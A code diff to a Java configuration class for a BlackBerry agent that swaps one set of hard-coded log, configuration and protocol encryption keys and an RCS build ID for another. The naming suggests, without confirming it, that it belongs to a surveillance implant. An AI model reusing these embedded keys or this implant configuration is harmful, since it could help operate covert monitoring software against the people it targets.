@@ -16,28 +16,19 @@ package blackberry.config;
 
 public final class InstanceKeysFake implements InstanceKeysEmbedded {
     //#ifdef FAKECONF
-    // RCS 1
-    byte[] logKey = new byte[] { (byte) 0x14, (byte) 0xe7, (byte) 0xff,
-            (byte) 0xc9, (byte) 0xa2, (byte) 0x9a, (byte) 0xb4, (byte) 0xcf,
-            (byte) 0x93, (byte) 0xd7, (byte) 0x38, (byte) 0xd8, (byte) 0xa8,
-            (byte) 0x99, (byte) 0x9d, (byte) 0xc4 };
-    byte[] confKey = new byte[] { (byte) 0xea, (byte) 0xaf, (byte) 0xf5,
-            (byte) 0xd4, (byte) 0xca, (byte) 0x87, (byte) 0x91, (byte) 0x14,
-            (byte) 0xe2, (byte) 0x5a, (byte) 0x65, (byte) 0xe0, (byte) 0x49,
-            (byte) 0x0b, (byte) 0x02, (byte) 0x28 };
-    byte[] protoKey = new byte[] { (byte) 0x7c, (byte) 0xe6, (byte) 0x62,
-            (byte) 0x59, (byte) 0xec, (byte) 0xe1, (byte) 0x0d, (byte) 0x5b,
-            (byte) 0xf6, (byte) 0x76, (byte) 0x8c, (byte) 0x20, (byte) 0x0b,
-            (byte) 0x3f, (byte) 0xe1, (byte) 0x27 };
+ // RCS 10
+    byte[] LogKey = new byte[]{ (byte)0x91, (byte)0x32, (byte)0xab, (byte)0x9e, (byte)0x6a, (byte)0x92, (byte)0xa3, (byte)0x15, (byte)0x82, (byte)0xc3, (byte)0xfa, (byte)0x7f, (byte)0x3f, (byte)0x74, (byte)0xe3, (byte)0xdb };
+    byte[] ConfKey = new byte[] { (byte)0xef, (byte)0xbb, (byte)0xa0, (byte)0x0a, (byte)0xf1, (byte)0xcf, (byte)0x2b, (byte)0x83, (byte)0xa5, (byte)0x86, (byte)0x8b, (byte)0xf7, (byte)0xf7, (byte)0x89, (byte)0xba, (byte)0x4c };
+    byte[] ProtoKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
 
     /**
      * Inject keysFake.
      */
     public void injectKeys(InstanceKeys keys) {
-        keys.setAesKey(logKey);
-        keys.setChallengeKey(protoKey);
-        keys.setBuildID("RCS_0000000001");
-        keys.setConfKey(confKey);
+        keys.setAesKey(LogKey);
+        keys.setChallengeKey(ProtoKey);
+        keys.setBuildID("RCS_0000000010");
+        keys.setConfKey(ConfKey);
     }
 
     public InstanceKeysFake() {
